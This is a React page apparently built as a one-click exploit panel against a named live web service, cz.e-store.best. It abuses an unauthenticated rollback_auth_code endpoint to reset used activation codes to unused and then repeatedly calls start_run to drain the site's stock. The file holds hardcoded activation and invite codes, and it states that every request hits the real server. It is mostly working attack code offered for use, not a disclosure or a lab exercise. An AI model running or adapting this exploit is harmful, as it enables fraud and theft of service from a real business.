/**
 * 真实 API 漏洞测试面板
 * 通过后端代理调用 cz.e-store.best 接口
 * 展示完整的漏洞利用链和任务执行过程
 */
import { useState, useRef, useEffect, useCallback } from 'react'

const DEFAULT_INVITE_CODE = '2BWFCAZKSGLRPNV'
const DEFAULT_AUTH_CODE = 'F2Y3QHQJJCF5'

async function callApi(action, params, method = 'POST') {
  if (method === 'GET') {
    const qs = new URLSearchParams({ action, ...params }).toString()
    const resp = await fetch(`/api/proxy?${qs}`)
    const text = await resp.text()
    try { return JSON.parse(text) } catch { return { raw: text } }
  } else {
    const resp = await fetch('/api/proxy', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, ...params }),
    })
    const text = await resp.text()
    try { return JSON.parse(text) } catch { return { raw: text } }
  }
}

async function getTaskLogs(taskId) {
  const qs = new URLSearchParams({ action: 'get_task_logs', task_id: taskId }).toString()
  const resp = await fetch(`/api/proxy/logs?${qs}`)
  return await resp.text()
}

export default function Home() {
  const [authCode, setAuthCode] = useState(DEFAULT_AUTH_CODE)
  const [inviteCode, setInviteCode] = useState(DEFAULT_INVITE_CODE)
  const [logs, setLogs] = useState([])
  const [taskLogs, setTaskLogs] = useState('')
  const [isRunning, setIsRunning] = useState(false)
  const [currentTaskId, setCurrentTaskId] = useState(null)
  const [stats, setStats] = useState(null)
  const [phase, setPhase] = useState('idle')
  const logRef = useRef(null)
  const taskLogRef = useRef(null)
  const pollingRef = useRef(null)

  const addLog = useCallback((type, text) => {
    setLogs(prev => [...prev, { time: new Date().toLocaleTimeString(), type, text }])
  }, [])

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight
  }, [logs])
  useEffect(() => {
    if (taskLogRef.current) taskLogRef.current.scrollTop = taskLogRef.current.scrollHeight
  }, [taskLogs])

  const fetchStats = useCallback(async () => {
    try {
      const result = await callApi('get_stats', {}, 'GET')
      if (result && !result.raw) setStats(result)
    } catch {}
  }, [])

  useEffect(() => {
    fetchStats()
    const iv = setInterval(fetchStats, 5000)
    return () => clearInterval(iv)
  }, [fetchStats])

  const startPolling = useCallback((taskId) => {
    if (pollingRef.current) clearInterval(pollingRef.current)
    pollingRef.current = setInterval(async () => {
      try {
        const raw = await getTaskLogs(taskId)
        setTaskLogs(raw)
        if (raw.includes('充值成功') || raw.includes('充值完成') || raw.includes('任务已完成')) {
          setPhase('done')
          addLog('success', '任务已完成！充值成功！')
          if (pollingRef.current) clearInterval(pollingRef.current)
          setIsRunning(false)
          fetchStats()
        } else if (raw.includes('失败') && !raw.includes('正在')) {
          setPhase('error')
          addLog('error', '任务执行失败')
          if (pollingRef.current) clearInterval(pollingRef.current)
          setIsRunning(false)
          fetchStats()
        }
      } catch (e) {
        addLog('error', `日志轮询失败: ${e}`)
      }
    }, 3000)
  }, [addLog, fetchStats])

  useEffect(() => {
    return () => { if (pollingRef.current) clearInterval(pollingRef.current) }
  }, [])

  // 完整漏洞利用链
  const executeAttackChain = async () => {
    if (isRunning) return
    setIsRunning(true)
    setLogs([])
    setTaskLogs('')
    setCurrentTaskId(null)

    try {
      // Step 1: query_by_auth_code
      setPhase('querying')
      addLog('info', '=== 步骤 1/3: 查询启动码关联的 task_id ===')
      addLog('request', `POST → action=query_by_auth_code, auth_code=${authCode}`)
      const queryResult = await callApi('query_by_auth_code', { auth_code: authCode })
      addLog('response', `响应: ${JSON.stringify(queryResult)}`)

      if (!queryResult.task_id) {
        addLog('info', '未找到 task_id，直接尝试 start_run...')
        setPhase('starting')
        addLog('request', `POST → action=start_run, auth_code=${authCode}, invite_code=${inviteCode}`)
        const startResult = await callApi('start_run', { auth_code: authCode, invite_code: inviteCode })
        addLog('response', `响应: ${JSON.stringify(startResult)}`)
        if (startResult.task_id) {
          setCurrentTaskId(startResult.task_id)
          addLog('success', `任务启动成功！task_id: ${startResult.task_id}`)
          setPhase('monitoring')
          addLog('info', '=== 开始监控真实任务日志（每3秒轮询） ===')
          startPolling(startResult.task_id)
        } else {
          addLog('error', `启动失败: ${startResult.message || '未知错误'}`)
          setPhase('error')
          setIsRunning(false)
        }
        return
      }

      const taskId = queryResult.task_id
      addLog('success', `获取到 task_id: ${taskId}`)

      // Step 2: rollback_auth_code
      setPhase('rolling_back')
      addLog('info', '=== 步骤 2/3: 回滚启动码状态（漏洞核心） ===')
      addLog('request', `POST → action=rollback_auth_code, task_id=${taskId}`)
      const rollbackResult = await callApi('rollback_auth_code', { task_id: taskId })
      addLog('response', `响应: ${JSON.stringify(rollbackResult)}`)

      if (rollbackResult.updated) {
        addLog('success', '启动码状态已被重置为"未使用"！漏洞利用成功！')
      } else {
        addLog('error', `回滚失败: ${JSON.stringify(rollbackResult)}`)
        setPhase('error')
        setIsRunning(false)
        return
      }

      // Step 3: start_run
      setPhase('starting')
      addLog('info', '=== 步骤 3/3: 使用重置后的启动码启动新任务 ===')
      addLog('request', `POST → action=start_run, auth_code=${authCode}, invite_code=${inviteCode}`)
      const startResult = await callApi('start_run', { auth_code: authCode, invite_code: inviteCode })
      addLog('response', `响应: ${JSON.stringify(startResult)}`)

      if (startResult.task_id) {
        const newTaskId = startResult.task_id
        setCurrentTaskId(newTaskId)
        addLog('success', `新任务启动成功！task_id: ${newTaskId}`)
        addLog('info', '库存已被消耗 -1！')
        setPhase('monitoring')
        addLog('info', '=== 开始监控真实任务日志（每3秒轮询） ===')
        startPolling(newTaskId)
        fetchStats()
      } else {
        addLog('error', `启动失败: ${startResult.message || '未知错误'}`)
        setPhase('error')
        setIsRunning(false)
      }
    } catch (e) {
      addLog('error', `请求异常: ${e}`)
      setPhase('error')
      setIsRunning(false)
    }
  }

  const doQuery = async () => {
    addLog('request', `POST query_by_auth_code → auth_code=${authCode}`)
    const r = await callApi('query_by_auth_code', { auth_code: authCode })
    addLog('response', JSON.stringify(r))
    if (r.task_id) setCurrentTaskId(r.task_id)
  }

  const doRollback = async () => {
    if (!currentTaskId) { addLog('error', '请先查询获取 task_id'); return }
    addLog('request', `POST rollback_auth_code → task_id=${currentTaskId}`)
    const r = await callApi('rollback_auth_code', { task_id: currentTaskId })
    addLog('response', JSON.stringify(r))
  }

  const doStart = async () => {
    addLog('request', `POST start_run → auth_code=${authCode}, invite_code=${inviteCode}`)
    const r = await callApi('start_run', { auth_code: authCode, invite_code: inviteCode })
    addLog('response', JSON.stringify(r))
    if (r.task_id) {
      setCurrentTaskId(r.task_id)
      setPhase('monitoring')
      setIsRunning(true)
      startPolling(r.task_id)
    }
  }

  const stopPolling = () => {
    if (pollingRef.current) { clearInterval(pollingRef.current); pollingRef.current = null }
    setIsRunning(false)
    setPhase('idle')
    addLog('info', '已停止监控')
  }

  const phaseLabels = {
    idle:         { text: '等待操作',              color: '#718096' },
    querying:     { text: '正在查询 task_id...',    color: '#f6ad55' },
    rolling_back: { text: '正在回滚启动码...',       color: '#f6ad55' },
    starting:     { text: '正在启动任务...',         color: '#f6ad55' },
    monitoring:   { text: '任务运行中，监控日志...', color: '#63b3ed' },
    done:         { text: '任务已完成',              color: '#68d391' },
    error:        { text: '操作失败',               color: '#fc8181' },
  }

  const logColor = {
    request:  '#63b3ed',
    response: '#b794f4',
    success:  '#68d391',
    error:    '#fc8181',
    info:     '#a0aec0',
  }

  return (
    <div style={{ minHeight: '100vh', background: '#0f1117', color: '#e2e8f0', fontFamily: "'Space Grotesk', system-ui, sans-serif", display: 'flex', flexDirection: 'column' }}>
      {/* 顶部栏 */}
      <div style={{ background: '#1a1a2e', borderBottom: '1px solid #2d3748', padding: '10px 24px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 8 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <span style={{ color: '#f6ad55', fontWeight: 700, fontSize: '1.05rem' }}>真实 API 漏洞测试面板</span>
          <span style={{ fontSize: 11, color: '#718096', background: '#2d3748', padding: '2px 8px', borderRadius: 4 }}>直接调用 cz.e-store.best 后端接口</span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, flexWrap: 'wrap' }}>
          {stats && (
            <div style={{ display: 'flex', gap: 6, fontSize: 11 }}>
              <span style={{ background: '#1c4532', color: '#68d391', padding: '3px 8px', borderRadius: 4 }}>库存: {stats.stock}</span>
              <span style={{ background: '#1a365d', color: '#63b3ed', padding: '3px 8px', borderRadius: 4 }}>邮箱: {stats.email}</span>
              <span style={{ background: '#44337a', color: '#b794f4', padding: '3px 8px', borderRadius: 4 }}>线程: {stats.active_workers}</span>
            </div>
          )}
          <span style={{ fontSize: 11, fontWeight: 500, color: phaseLabels[phase]?.color || '#718096' }}>
            {phaseLabels[phase]?.text || ''}
          </span>
        </div>
      </div>

      <div style={{ display: 'flex', flex: 1, overflow: 'hidden', height: 'calc(100vh - 52px)' }}>
        {/* 左侧控制面板 */}
        <div style={{ width: 400, minWidth: 300, borderRight: '1px solid #2d3748', padding: 20, display: 'flex', flexDirection: 'column', overflowY: 'auto', gap: 0 }}>
          {/* 漏洞说明 */}
          <div style={{ marginBottom: 16, padding: 12, background: '#2d1515', border: '1px solid rgba(229,62,62,0.4)', borderRadius: 8 }}>
            <div style={{ color: '#fc8181', fontSize: 13, fontWeight: 600, marginBottom: 6 }}>漏洞链说明</div>
            <p style={{ fontSize: 11, color: 'rgba(252,129,129,0.8)', lineHeight: 1.6 }}>
              利用 <code style={{ background: '#1a202c', padding: '0 4px', borderRadius: 3, fontFamily: "'JetBrains Mono', monospace" }}>rollback_auth_code</code> 接口无鉴权的缺陷，
              将已使用的启动码状态重置为"未使用"，然后重复调用 <code style={{ background: '#1a202c', padding: '0 4px', borderRadius: 3, fontFamily: "'JetBrains Mono', monospace" }}>start_run</code> 消耗库存。
              所有接口均无需极验验证码。<strong>所有请求均发送到真实服务器。</strong>
            </p>
          </div>

          {/* 输入区 */}
          <div style={{ marginBottom: 12 }}>
            <label style={{ fontSize: 11, color: '#a0aec0', display: 'flex', alignItems: 'center', gap: 4, marginBottom: 6 }}>
              启动码 (Auth Code)
              <span style={{ marginLeft: 'auto', color: '#f6ad55', fontSize: 10 }}>已使用过的码也可以</span>
            </label>
            <input
              type="text"
              value={authCode}
              onChange={e => setAuthCode(e.target.value)}
              style={{ width: '100%', background: '#2d3748', border: '1px solid #4a5568', borderRadius: 8, padding: '8px 12px', fontSize: 13, color: '#e2e8f0', outline: 'none', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
            />
          </div>

          <div style={{ marginBottom: 16 }}>
            <label style={{ fontSize: 11, color: '#a0aec0', display: 'flex', alignItems: 'center', gap: 4, marginBottom: 6 }}>
              邀请码 (Invite Code)
            </label>
            <input
              type="text"
              value={inviteCode}
              onChange={e => setInviteCode(e.target.value)}
              style={{ width: '100%', background: '#2d3748', border: '1px solid #4a5568', borderRadius: 8, padding: '8px 12px', fontSize: 13, color: '#e2e8f0', outline: 'none', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
            />
          </div>

          {/* 一键攻击按钮 */}
          <button
            onClick={executeAttackChain}
            disabled={isRunning}
            style={{
              width: '100%', padding: '12px', borderRadius: 8, fontWeight: 600, fontSize: 13,
              cursor: isRunning ? 'not-allowed' : 'pointer', border: 'none',
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
              marginBottom: 10, transition: 'background 0.2s',
              background: isRunning ? '#2d3748' : '#e53e3e',
              color: isRunning ? '#718096' : '#fff',
              fontFamily: "'Space Grotesk', sans-serif",
            }}
          >
            {isRunning ? '执行中...' : '一键执行漏洞链（query → rollback → start）'}
          </button>

          {isRunning && (
            <button
              onClick={stopPolling}
              style={{ width: '100%', padding: '8px', borderRadius: 8, fontWeight: 600, fontSize: 13, cursor: 'pointer', border: 'none', background: '#d69e2e', color: '#1a202c', marginBottom: 10, fontFamily: "'Space Grotesk', sans-serif" }}
            >
              停止监控
            </button>
          )}

          {/* 分步操作 */}
          <div style={{ borderTop: '1px solid #2d3748', paddingTop: 12, marginTop: 4 }}>
            <p style={{ fontSize: 10, color: '#718096', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>分步手动操作</p>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
              {[
                { label: '1. 查询 task_id (query_by_auth_code)', fn: doQuery },
                { label: '2. 回滚启动码 (rollback_auth_code)', fn: doRollback },
                { label: '3. 启动任务 (start_run)', fn: doStart },
              ].map(({ label, fn }) => (
                <button key={label} onClick={fn} style={{ width: '100%', padding: '8px', borderRadius: 8, fontSize: 11, fontWeight: 500, cursor: 'pointer', border: 'none', background: '#2d3748', color: '#e2e8f0', fontFamily: "'Space Grotesk', sans-serif" }}>
                  {label}
                </button>
              ))}
            </div>
          </div>

          {/* 当前 task_id */}
          {currentTaskId && (
            <div style={{ marginTop: 12, padding: 8, background: 'rgba(26,54,93,0.5)', border: '1px solid rgba(49,130,206,0.4)', borderRadius: 8, fontSize: 11 }}>
              <span style={{ color: '#90cdf4' }}>当前 task_id: </span>
              <span style={{ color: '#63b3ed', wordBreak: 'break-all', fontFamily: "'JetBrains Mono', monospace" }}>{currentTaskId}</span>
            </div>
          )}
        </div>

        {/* 右侧日志面板 */}
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
          {/* API 调用日志 */}
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', borderBottom: '1px solid #2d3748', overflow: 'hidden' }}>
            <div style={{ padding: '8px 20px', borderBottom: '1px solid #2d3748', background: '#1a202c', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: '#a0aec0' }}>API 调用日志</span>
              <button onClick={() => setLogs([])} style={{ fontSize: 10, color: '#718096', background: 'none', border: 'none', cursor: 'pointer' }}>清空</button>
            </div>
            <div ref={logRef} style={{ flex: 1, padding: 16, overflowY: 'auto', fontSize: 11, lineHeight: 1.6, background: '#0a0a0f', fontFamily: "'JetBrains Mono', monospace" }}>
              {logs.length === 0 ? (
                <div style={{ color: '#4a5568', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', gap: 6, textAlign: 'center' }}>
                  <p>点击左侧按钮开始漏洞测试</p>
                  <p style={{ fontSize: 10 }}>所有请求将通过后端代理发送到 cz.e-store.best 真实服务器</p>
                </div>
              ) : (
                logs.map((log, i) => (
                  <div key={i} style={{ padding: '1px 0', color: logColor[log.type] || '#a0aec0', fontWeight: log.type === 'success' ? 700 : 400 }}>
                    <span style={{ color: '#4a5568', marginRight: 8 }}>[{log.time}]</span>
                    {log.type === 'request'  && <span style={{ color: '#f6ad55', marginRight: 4 }}>{'→'}</span>}
                    {log.type === 'response' && <span style={{ color: '#b794f4', marginRight: 4 }}>{'←'}</span>}
                    {log.text}
                  </div>
                ))
              )}
            </div>
          </div>

          {/* 任务实时日志 */}
          <div style={{ height: '45%', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
            <div style={{ padding: '8px 20px', borderBottom: '1px solid #2d3748', background: '#1a202c', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: '#a0aec0' }}>任务实时日志（来自 cz.e-store.best 真实服务器）</span>
              {phase === 'monitoring' && (
                <span style={{ fontSize: 10, color: '#f6ad55', display: 'flex', alignItems: 'center', gap: 4 }}>
                  <span style={{ width: 6, height: 6, background: '#f6ad55', borderRadius: '50%', display: 'inline-block', animation: 'pulse 1.2s infinite' }}></span>
                  每 3 秒轮询中...
                </span>
              )}
            </div>
            <div ref={taskLogRef} style={{ flex: 1, padding: 16, overflowY: 'auto', fontSize: 11, lineHeight: 1.6, background: '#0d0d14', whiteSpace: 'pre-wrap', fontFamily: "'JetBrains Mono', monospace" }}>
              {taskLogs || (
                <div style={{ color: '#4a5568', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', gap: 6 }}>
                  <p>任务启动后将在此显示来自真实服务器的日志</p>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #2d3748; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #4a5568; }
        input:focus { border-color: #4299e1 !important; }
        button:hover { opacity: 0.9; }
      `}</style>
    </div>
  )
}
